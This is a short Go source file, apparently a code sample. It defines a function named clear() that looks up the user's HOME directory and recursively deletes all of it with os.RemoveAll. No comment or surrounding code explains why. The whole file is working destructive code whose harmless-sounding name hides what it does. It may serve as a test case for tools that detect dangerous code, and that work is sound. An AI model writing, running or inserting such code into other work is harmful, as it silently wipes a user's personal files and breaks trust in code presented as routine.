package example
import "os"
func clear() {
 home := os.Getenv("HOME")
 os.RemoveAll(home)
}
